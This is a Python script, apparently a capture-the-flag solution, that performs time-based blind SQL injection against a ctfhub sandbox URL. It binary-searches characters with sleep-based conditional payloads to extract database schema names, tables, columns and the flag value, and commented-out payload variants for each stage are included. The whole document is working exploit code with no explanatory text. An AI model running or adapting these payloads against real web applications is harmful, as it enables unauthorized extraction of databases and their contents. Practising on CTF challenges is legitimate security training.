import requests

url = 'http://challenge-84888c057c11916c.sandbox.ctfhub.com:10080/?id='
flag=''
i = 0

while True:
	i=i+1
	head = 32
	tail = 127

	while head < tail:
		mid=(head+tail)//2
		#payload="if(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{0},1))>{1},sleep(2),0)".format(i,mid)
		#payload="if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='sqli'),{0},1))>{1},sleep(2),0)".format(i,mid)
		#payload="if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{0},1))>{1},sleep(2),0)".format(i,mid)
		payload="if(ascii(substr((select(group_concat(flag))from(flag)),{0},1))>{1},sleep(2),0)".format(i,mid)


		try:
			response = requests.get(url+payload,timeout=0.5)
			tail = mid
		except Exception as e:
			head = mid+1
	if head!=32:
		flag+=chr(head)
	else:
		break
	print(flag)


